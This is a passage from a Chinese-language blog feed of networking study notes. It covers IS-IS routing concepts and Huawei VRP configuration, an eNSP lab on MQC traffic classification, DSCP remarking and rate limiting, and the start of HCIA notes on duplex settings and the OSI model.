class="line">qu</span><br></pre></td></tr></table></figure><hr><h1 id="三、ISIS（内部网关协议）"><a href="#三、ISIS（内部网关协议）" class="headerlink" title="三、ISIS（内部网关协议）"></a>三、ISIS（内部网关协议）</h1><ul><li>IS-IS属于内部网关协议，用于自治系统内部。</li><li>IS-IS是一种基于SPF算法的链路状态协议，同时也是一种内部网关协议。</li><li>IS-IS一般应用于大型网络，维护路由器和路由器之间的动态更新信息</li></ul><hr><h2 id="路由计算过程"><a href="#路由计算过程" class="headerlink" title="路由计算过程"></a><strong>路由计算过程</strong></h2><p>邻居关系建立——链路信息交换（LSDB）——-路由计算（SPF）———&gt;路由表（RIB）</p><p>OSI的参考标准（IS-IS）———VS———TCP/IP （RIP、eigrp、OSPF、BGP）</p><p>OSI和IP的集成———&gt;集成的ISIS协议 （直接封装在二层协议上）</p><p>集成的ISIS可以支持纯CLNP网络或者纯IP网络，或者同时运行</p><p>ISIS规范中把网络节点叫做中间系统，OSPF把节点叫做路由器</p><p>ISIS的意思是中间系统到中间系统，是为ISO无连接网络协议设计的路由选择协议<br>（IS，即中间系统，即Router）       ISO—-&gt;（CLNP）</p><hr><blockquote><p>ISIS是ISO定义的OSI协议中无连接网络服务CLNS的一部分。用于动态路由数据包<br>CLNS由以下三个协议构成：<br>    CLNP:类似于TCP/IP中的IP协议。IP协议在TCP/IP传输层服务。CLNP在OSI传输层服务<br>    IS-IS：中间系统（路由器）间的路由协议，类似于IP中的OSPF<br>    ES-IS：主机系统与中间系统间的协议，类似于IP中的ARP，IGMP等（E-代表终端）</p><p>OSPF和ISIS的共同特征<br>    维护一个链路状态数据库，基于SPF算法<br>    都利用Hello包形成和维护邻居关系<br>    都使用区域的概念来构成层次化的拓扑结构（level 2 /level 1）<br>    都提供在区域之间提供地址汇总的能力<br>    无类路由协议<br>    都选取一个指定路由器来描述广播性网络—-路由器就等于ISIS （DIS—指定的IS）<br>    认证能力   </p></blockquote><hr><blockquote><p>NSAP（网络服务接入点，是OSI协议中用于定位资源地址）<br>    相当于OSI的网络层协议CLNP的地址（类似IP地址概念）</p><p>​            NSAP格式，需要牢记Area ID、System ID和NSEL，对NET地址来讲，永远为00</p><p>NET是一类特殊的NSAP（网络实体标题）network entity tittle，一定要记住的名词<br>            如果没有NET地址，那么ISIS不运行<br>            NET地址的作用：标识区域+系统ID(RID)</p><p>NET地址包括：<br>            区域ID(Area id)+系统ID(System id)+SEL（端口号）<br>            区域ID用于区域之间的路由选择<br>            系统ID即路由器ID用于区域内的路由选择<br>            SEL等同于TCP的端口号，固定为00<br>            用.划分了六段 （可以变长）<br>            NET地址在ISIS协议中可以有多个</p><p>例：49.0001.0002.2222.4444.00<br>Area=49.0001  SysID=0002.2222.4444  Nsel=00  （47为公有地址，49为私有地址）</p></blockquote><hr><h2 id="关于System-ID"><a href="#关于System-ID" class="headerlink" title="关于System ID"></a><strong>关于System ID</strong></h2><p>​    一个中间系统（路由器）至少有一个NET（最多可有254个）<br>​    ISIS不是基于接口而是基于路由器，同一个Area的中间系统必须有相同的Area ID<br>​    每个中间系统在一个Area中必须有一个唯一的System ID（路由器 ID）</p><hr><h2 id="级别"><a href="#级别" class="headerlink" title="级别"></a>级别</h2><p>L1——&gt;L1/L2——&gt;L2     (L1/L2相当于ABR）</p><p>ISIS的接口可以属于不同区域（默认属于L1/L2区域）——OSPF只能属于一个区域</p><p>ISIS中，单个区域没有物理骨干与非骨干区域的概念；在OSPF中Area 0 被定义为骨干区域</p><p>ISIS中，L1和L2级别的路由器分别采用SPF算法，分别生成最短路径书SPT；OSPF中同一区域才使用SPF</p><p>L1路由器只负责维护L1区域的LSDB，该LSDB包含本区域的路由信息</p><p>IS类型级别 L1、L2、L1/L2        接口级别称之为 circuit type</p><p>默认：L1/L2路由器，同时维护两个LSDB，L1的LSDB用于区域内路由，L2的LSDB用于区域间路由</p><hr><h2 id="ISIS的报文"><a href="#ISIS的报文" class="headerlink" title="ISIS的报文"></a><strong>ISIS的报文</strong></h2><p>1）IIH，中间系统到中间系统的hello包<br>2）LSP，链路状态信息单元（包含LS的更新）<br>3）SNP：    PSNP部分序列号协议数据单元（P—-部分的，类似于OSPF的LSR和LSACK）<br>    CSNP全部序列号协议数据单元（complete—-完整的，类似于OSPF的DD报文）</p><p>以上三种报文都有L1、L2的区分</p><hr><h2 id="ISIS的网络类型"><a href="#ISIS的网络类型" class="headerlink" title="ISIS的网络类型"></a>ISIS的网络类型</h2><p>（在ISIS当中不同的网络类型，完全不可以建立邻居）<br>1）点到点的网络（PPP、HDLC）<br>2）广播行的网络（以太网）（DIS指定中间系统）</p><p>DIS的选举：L1和L2的DIS 是分别选举的<br>       优先级数值大被选举为DIS，若相同则比对MAC地址，大的将被选举<br>       优先级为0的也可以参与选举，而且支持抢占<br>       同一网段同一级别的路由器之间都会形成领接关系<br>       DIS发送hello的时间间隔为10/3(3.3S),其他非DIS路由器发送间隔为10S</p><p>接口网络类型的改变：<br>1）以太网（默认是广播）可以改为点到点<br>2）点到点不能改为广播<br>3）两种网络类型不能建立邻居</p><p>广播领接关系的建立：三次握手     （三次的可靠性高）<br>P-2-P领接关系的建立：可以是两次握手也可以是三次</p><hr><h2 id="ISIS形成邻居关系的条件"><a href="#ISIS形成邻居关系的条件" class="headerlink" title="ISIS形成邻居关系的条件"></a>ISIS形成邻居关系的条件</h2><p>​    同一层次<br>​    同一区域<br>​    同一网段<br>​    相同的网络类型 </p><p>相1为命（只有L1会严格价差区域ID）<br>    1）Area ID 不同（L1严格检查区域ID）———只能建立L2的邻居关系<br>    2）L1/L2设备如果区域ID相同可以建立L1和L2的邻居</p><hr><blockquote><p>L1的默认路由是L1/L2下发的：L2可以自动学习到L1的路由；L1不能够自动学习到L2的路由<br>对ISIS来讲L1区域的路由永远是优于L2的</p></blockquote><hr><p>广播网络LSP的交互过：<br>    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    新加入的路由器与其他路由器建立邻居关系——&gt;将自己的LSP发往组播地址，所有邻居都可以收到该LSP</p><p>​    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    该网段的DIS把收到的LSP加入自己的LSDB中，并发送CSNP</p><p>​    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    新加入的路由器收到DIS的CSNP报文，对比自己的LSDB，然后向DIS发送PSNP请求自己没有的LSP</p><p>​    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    DIS收到PSNP后向该路由器发送对应的LSP进行同步</p><p>P-2-P网络LSP的交互过程：</p><p>​        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p2p网络中，PSNP的作用类似于ACK</p><p>​        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;作为应答确认收到的LSP</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用来请求所需的LSP</p><hr><p>ISIS的收敛特性</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;增量最短路径优先算法I-SPF</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只对受影响的节点进行路由计算</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只第一次计算全部节点</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;部分路由计算PRC</p><hr><h2 id="具体配置-1"><a href="#具体配置-1" class="headerlink" title="具体配置"></a>具体配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[AR2]isis ?</span><br><span class="line">  INTEGER&lt;1-65535&gt;  Process ID--------进程ID，TAG</span><br><span class="line">  vpn-instance      VPN Routing/Forwarding instance------关联MPLS vpn中的vrf实例</span><br><span class="line">  Please press ENTER to execute command----回车，默认进程1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[AR2-isis-1]network-entity ?------------配置NET地址，47为公有，49为私有地址</span><br><span class="line"></span><br><span class="line">  XX.XXXX. ... .XXXX.XX  Network Entity Title (NET)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[AR2-isis-1]dis th------------------查看端口信息</span><br><span class="line">[V200R003C00]</span><br><span class="line">#</span><br><span class="line">isis 1</span><br><span class="line"> network-entity 49.0123.0000.0000.2222.00</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[AR2-LoopBack0]isis enable 1</span><br><span class="line">[AR2-LoopBack0]int s 1/0/0</span><br><span class="line">[AR2-Serial1/0/0]isis en                        &#125; 进入接口使能Isis</span><br><span class="line">[AR2-Serial1/0/0]isis enable 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[AR2]dis isis brief---------查看Isis基本信息</span><br><span class="line">[AR3-Serial1/0/0]dis th----------查看接口信息</span><br><span class="line">[V200R003C00]</span><br><span class="line">#</span><br><span class="line">interface Serial1/0/0</span><br><span class="line"> link-protocol ppp</span><br><span class="line"> ip address 23.1.1.3 255.255.255.0 </span><br><span class="line"> isis enable 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[AR3]dis isis peer---------------查看邻居情况</span><br><span class="line"></span><br><span class="line">                      Peer information for ISIS(1)</span><br><span class="line"></span><br><span class="line">  System Id（对端系统ID）     Interface          Circuit Id          State  HoldTime  Type     PRI</span><br><span class="line"></span><br><span class="line">0000.0000.2222                   S1/0/0         0000000002        Up         24s           L1L2     -- </span><br><span class="line"></span><br><span class="line">Total Peer(s): 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;AR3&gt;dis ip rou pro isis---------查看Isis路由器情况</span><br><span class="line">Route Flags: R - relay, D - download to fib</span><br><span class="line"></span><br><span class="line">Public routing table : ISIS</span><br><span class="line">         Destinations : 1        Routes : 1        </span><br><span class="line"></span><br><span class="line">ISIS routing table status : &lt;Active&gt;</span><br><span class="line">         Destinations : 1        Routes : 1</span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">   22.1.1.0/24  ISIS-L1 15   10          D   23.1.1.2        Serial1/0/0</span><br><span class="line"></span><br><span class="line">ISIS routing table status : &lt;Inactive&gt;</span><br><span class="line"></span><br><span class="line">​         Destinations : 0        Routes : 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[AR1-isis-1]is-level level-2---------修改类型            </span><br><span class="line">[AR2-LoopBack0]isis circuit-level level-2-----------进入接口下修改类型</span><br><span class="line">interface LoopBack0</span><br><span class="line"> ip address 22.1.1.1 255.255.255.0 </span><br><span class="line"> isis enable 1</span><br><span class="line"></span><br><span class="line"> isis circuit-level level-2---------------该接口的电路类型改为L2，R1学习不到该路由</span><br><span class="line"></span><br><span class="line">[AR3-GigabitEthernet0/0/1]isis dis-priority ?</span><br><span class="line">  INTEGER&lt;0-127&gt;  Value of priority</span><br><span class="line">[AR3-GigabitEthernet0/0/1]isis dis-priority 127------修改DIS优先级</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HCIP </tag>
            
            <tag> OSPF </tag>
            
            <tag> BGP </tag>
            
            <tag> ISIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>eNSP流策略实验</title>
      <link href="/posts/4a17b156/"/>
      <url>/posts/4a17b156/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>通过阶段性的学习，逐渐熟悉MQC的工作原理以及Qos协议</p><ul><li>掌握配置端到端QoS的方法</li><li>掌握使用流策略实现流行为控制的方法</li><li>通过理论知识，结合实验，熟悉MQC的主要工作原理，流分类、流行为、流策略的部署过程</li></ul><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/LCL02.png" alt=""></p><hr><h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/LCL01.jpg" alt=""></p><hr><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="配置基础IP地址和掩码"><a href="#配置基础IP地址和掩码" class="headerlink" title="配置基础IP地址和掩码"></a>配置基础IP地址和掩码</h2><p>略……..</p><h2 id="配置缺省静态地址"><a href="#配置缺省静态地址" class="headerlink" title="配置缺省静态地址"></a>配置缺省静态地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R1]ip route-static 10.0.34.0 255.255.255.0 10.0.12.2</span><br><span class="line">[R2]ip route-static 10.0.145.0 255.255.255.0 10.0.12.1</span><br><span class="line">[R3]ip route-static 0.0.0.0 0.0.0.0 10.0.34.2</span><br><span class="line">[R4]ip route-static 0.0.0.0 0.0.0.0 10.0.145.1</span><br><span class="line">[R5]ip route-static 0.0.0.0 0.0.0.0 10.0.145.1</span><br><span class="line">[S3]ip route-static 0.0.0.0 0.0.0.0 10.0.145.1</span><br><span class="line">[S4]ip route-static 0.0.0.0 0.0.0.0 10.0.34.2</span><br></pre></td></tr></table></figure><h2 id="配置-DSCP-优先级的重标记"><a href="#配置-DSCP-优先级的重标记" class="headerlink" title="配置 DSCP 优先级的重标记"></a>配置 DSCP 优先级的重标记</h2><p><strong><em>points：（DSCP就是为了保证通信的QoS，在数据包IP头部的8个标识字节进行编码，来划分服务类别，区分服务的优先级。）</em></strong></p><ul><li><p>将<strong>AR4</strong>与<strong>AR3</strong>之间的流量模拟为<strong>语音报文</strong></p></li><li><p>将<strong>AR5</strong>与<strong>AR3</strong>之间的流量模拟为<strong>视频报文</strong></p></li><li><p>语音报文和视频报文做相关的QoS策略</p><p>在SW1上创建ACL3001，3002，分别匹配AR4去往AR3，AR5去往AR3的流量。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW1]acl number 3001</span><br><span class="line">[SW1-acl-adv-3001]rule 5 permit ip source 10.0.145.4 0 destination 10.0.34.3 0</span><br><span class="line"> </span><br><span class="line">[SW1]acl number 3002</span><br><span class="line">[SW1-acl-adv-3002]rule 5 permit ip source 10.0.145.5 0 destination 10.0.34.3 0</span><br></pre></td></tr></table></figure><p><strong>在SW1上对语音业务进行配置</strong></p><ul><li>在SW1上创建<strong>流分类 class-voice-SW1</strong>，匹配ACL3001。</li><li>在SW1上创建<strong>流行为 behavior-voice-SW1</strong>，将DSCP优先级重标记为<strong>ef</strong>。</li><li>在SW1上创建<strong>流策略 policy-voice-SW1</strong></li><li>关联<strong>流分类class-voice-SW1</strong>与流行为behavior-voice-SW1，在SW1上的G0/0/4接口入方向上调用该流策略</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[SW1]traffic classifier class-voice-SW1                        </span><br><span class="line">[SW1-classifier-class-voice-SW1]if-match acl 3001  </span><br><span class="line"> </span><br><span class="line">[SW1]traffic behavior behavior-voice-SW1</span><br><span class="line">[SW1-behavior-behavior-voice-SW1]remark dscp ef</span><br><span class="line">     </span><br><span class="line">[SW1]traffic policy policy-voice-SW1</span><br><span class="line">[SW1-trafficpolicy-policy-voice-SW1]classifier class-voice-SW1 behavior behavior-voice-SW1</span><br><span class="line"> </span><br><span class="line">[SW1]interface GigabitEthernet0/0/4</span><br><span class="line">[SW1-GigabitEthernet0/0/4]traffic-policy policy-voice-SW1 inbound</span><br></pre></td></tr></table></figure><p><strong>在SW1上对视屏业务进行MQC配置</strong></p><ul><li>在SW1上创建流分类 class-video-SW1，匹配ACL3002。</li><li>在SW1上创建<strong>流行为 behavior-video-SW1</strong>，将DSCP优先级重标记为<strong>AF32</strong>。</li><li>在SW1上创建<strong>流策略 policy-video-SW1</strong></li><li>关联<strong>流分类class-video-SW1</strong>与<strong>流行为behavior-video-SW1</strong>，在SW1上的G0/0/5接口入方向上应用该流策略。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[SW1]traffic classifier class-video-SW1</span><br><span class="line">[SW1-classifier-class-video-SW1]if-match acl 3001  </span><br><span class="line"> </span><br><span class="line">[SW1]traffic behavior behavior-video-SW1</span><br><span class="line">[SW1-behavior-behavior-video-SW1]remark dscp af32  </span><br><span class="line">     </span><br><span class="line">[SW1]traffic policy policy-video-SW1</span><br><span class="line">[SW1-trafficpolicy-policy-video-SW1]classifier class-video-SW1 behavior behavior-video-SW1</span><br><span class="line"> </span><br><span class="line">[SW1]interface GigabitEthernet0/0/5</span><br><span class="line">[SW1-GigabitEthernet0/0/4]traffic-policy policy-video-SW1 inbound</span><br></pre></td></tr></table></figure><p>在SW2上创建ACL3001，3002，分别匹配AR3去往AR4，AR3去往AR5的流量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW2]acl number 3001</span><br><span class="line">[SW2-acl-adv-3001]rule 5 permit ip source 10.0.34.3 0 destination 10.0.145.4 0</span><br><span class="line"> </span><br><span class="line">[SW2]acl number 3002</span><br><span class="line">[SW2-acl-adv-3002]rule 5 permit ip source 10.0.34.3 0 destination 10.0.145.5 0</span><br></pre></td></tr></table></figure><p><strong>在SW2上对语音业务进行配置</strong></p><ul><li>在SW2上创建<strong>流分类 class-voice-SW2</strong>，匹配ACL3001。</li><li>在SW2上创建<strong>流行为 behavior-voice-SW2</strong>，将DSCP优先级重标记为<strong>EF</strong>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW2]traffic classifier class-voice-SW2                </span><br><span class="line">[SW2-classifier-class-voice-SW2]if-match acl 3001  </span><br><span class="line"> </span><br><span class="line">[SW2]traffic behavior behavior-voice-SW2</span><br><span class="line">[SW2-behavior-behavior-voice-SW2]remark dscp ef</span><br><span class="line">     </span><br><span class="line">[SW2]traffic policy policy-voice-SW2</span><br><span class="line">[SW2-trafficpolicy-policy-voice-SW2]classifier class-voice-SW2 behavior behavior-voice-SW2</span><br></pre></td></tr></table></figure><p><strong>在SW2上对视频业务进行配置</strong></p><ul><li>在SW2上创建<strong>流分类 class-video-SW2</strong>，匹配ACL3002。</li><li>在SW2上创建<strong>流行为 behavior-video-SW2</strong>，将DSCP优先级重标记为<strong>AF32</strong>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW2]traffic classifier class-video-SW2</span><br><span class="line">[SW2-classifier-class-video-SW2]if-match acl 3001  </span><br><span class="line"> </span><br><span class="line">[SW2]traffic behavior behavior-video-SW2</span><br><span class="line">[SW2-behavior-behavior-video-SW2]remark dscp af32  </span><br><span class="line">     </span><br><span class="line">[SW2]traffic policy policy-video-SW2</span><br><span class="line">[SW2-trafficpolicy-policy-video-SW2]classifier class-video-SW2 behavior behavior-video-SW2</span><br></pre></td></tr></table></figure><p><strong>在SW2上创建流策略 policy-voice-video-SW2**</strong></p><ul><li>关联流分类class-voice-SW2与流行为behavior-voice-SW2</li><li>关联流分类class-video-SW2与流行为behavior-video-SW2，在SW2上的G0/0/3接口入方向上应用该流策略。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]traffic policy policy-voice-video-SW2</span><br><span class="line">[SW2-trafficpolicy-policy-voice-video-SW2]classifier class-voice-SW2 behavior behavior-voice-SW2</span><br><span class="line">[SW2-trafficpolicy-policy-voice-video-SW2]classifier class-video-SW2 behavior behavior-video-SW2</span><br></pre></td></tr></table></figure><hr><h2 id="配置流量整形和监管"><a href="#配置流量整形和监管" class="headerlink" title="配置流量整形和监管"></a>配置流量整形和监管</h2><p>核心交换机上部署流量整形，缓解流量拥塞的问题。</p><ul><li>在S21上的接口G0/0/1出方向上配置流量整形，CIR设为128kbit/s，CBS设为 16000Byte</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface GigabitEthernet0/0/1</span><br><span class="line">[SW1-GigabitEthernet0/0/1]qos lr outbound cir 128 cbs 16000</span><br><span class="line"> </span><br><span class="line">验证</span><br><span class="line">[SW1]dis qos lr outbound interface GigabitEthernet 0/0/1</span><br><span class="line">GigabitEthernet0/0/1 lr outbound:</span><br><span class="line">  cir: 128 Kbps, cbs: 16000 Byte</span><br></pre></td></tr></table></figure><ul><li>在SW2上的接口G0/0/1出方向上配置流量整形，CIR设为128kbit/s，CBS设为 16000Byte</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW2]interface GigabitEthernet0/0/2</span><br><span class="line">[SW2-GigabitEthernet0/0/2]qos lr outbound cir 128 cbs 16000</span><br><span class="line"> </span><br><span class="line">验证</span><br><span class="line">[SW2]dis qos lr outbound interface GigabitEthernet 0/0/2</span><br><span class="line">GigabitEthernet0/0/2 lr outbound:</span><br><span class="line">  cir: 128 Kbps, cbs: 16000 Byte</span><br></pre></td></tr></table></figure><p>出口路由器上部署流量监管，进一步缓解流量拥塞的问题。</p><ul><li>在AR1上的G0/0/1接口入方向上配置流量监管，CIR设为72kbit/s。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AR1]interface GigabitEthernet0/0/1</span><br><span class="line">[AR1-GigabitEthernet0/0/1]qos car inbound cir 72</span><br></pre></td></tr></table></figure><ul><li>在AR2上的G0/0/2接口入方向上配置流量监管，CIR设为72kbit/s。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AR2]interface GigabitEthernet0/0/2</span><br><span class="line">[AR2-GigabitEthernet0/0/2]qos car inbound cir 72</span><br></pre></td></tr></table></figure><h2 id="配置基于流策略实现流行为控制"><a href="#配置基于流策略实现流行为控制" class="headerlink" title="配置基于流策略实现流行为控制"></a>配置基于流策略实现流行为控制</h2><ul><li>在AR1上创建ACL3003，匹配从AR5去往SW4流量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AR1]acl number 3003</span><br><span class="line">[AR1-acl-adv-3003]rule 5 permit ip source 10.0.145.5 0 destination 10.0.34.4 0</span><br></pre></td></tr></table></figure><ul><li>在AR1上创建流分类class-video</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AR1]traffic classifier class-video</span><br><span class="line">[AR1-classifier-class-video]if-match acl 3003</span><br></pre></td></tr></table></figure><ul><li>在AR1上创建流行为behavior-video，配置命令permit，执行允许动作。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AR1]traffic behavior behavior-video</span><br><span class="line">[AR1-behavior-behavior-video]permit</span><br></pre></td></tr></table></figure><ul><li>在AR1上创建流策略policy-video，关联流分类class-video与流行为behavior-video，并在接口G0/0/1的入方向上应用。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[AR1]traffic policy policy-video</span><br><span class="line">[AR1-trafficpolicy-policy-video]classifier class-video behavior behavior-video</span><br><span class="line">[AR1-trafficpolicy-policy-video]quit</span><br><span class="line">[AR1]interface GigabitEthernet0/0/1</span><br><span class="line">[AR1-GigabitEthernet0/0/1]traffic-policy policy-video inbound</span><br><span class="line"> </span><br><span class="line">查看</span><br><span class="line">[AR1]display traffic policy user-defined policy-video</span><br><span class="line">  User Defined Traffic Policy Information:</span><br><span class="line">  Policy: policy-video</span><br><span class="line">   Classifier: class-video</span><br><span class="line">    Operator: OR</span><br><span class="line">     Behavior: behavior-video</span><br><span class="line">      Permit</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 学习实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MQC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCIA学习笔记</title>
      <link href="/posts/9255c8f2/"/>
      <url>/posts/9255c8f2/</url>
      
        <content type="html"><![CDATA[<h1 id="双工模式"><a href="#双工模式" class="headerlink" title="双工模式"></a><strong>双工模式</strong></h1><p>[SW1-GigabitEthernet0/0/1]duplex full —————-&gt;修改为全双工<br>Error: Please undo negotiation auto first.—————&gt;请关闭自动协商</p><p>[SW1-GigabitEthernet0/0/1]undo negotiation auto —-&gt;关闭自动协商</p><hr><h1 id="OSI参考模型和TCP-IP工业模型"><a href="#OSI参考模型和TCP-IP工业模型" class="headerlink" title="OSI参考模型和TCP/IP工业模型"></a><strong>OSI参考模型和TCP/IP工业模型</strong></h1><p>一般不会按照设备来划分层次（除了物理层），用协议划分层次</p><div class="table-container"><table><thead><tr><th style="text-align:center"><strong>OSI参考模型</strong></th><th style="text-align:center">单位</th><th style="text-align:center">内容/作用</th></tr></thead><tbody><tr><td style="text-align:center">应用层</td><td style="text-align:center">PDU</td><td style="text-align:center">人机交互，app</td></tr><tr><td style="text-align:center">表示层</td><td style="text-align:center">PDU</td><td style="text-align:center">变成能够理解的东西，png，gif</td></tr><tr><td style="text-align:center">会话层</td><td style="text-align:center">PDU</td><td style="text-align:center">管理会话系统，Windows/Linux/VRP</td></tr><tr><td style="text-align:center">传输层</td><td style="text-align:center">segment（段）</td><td 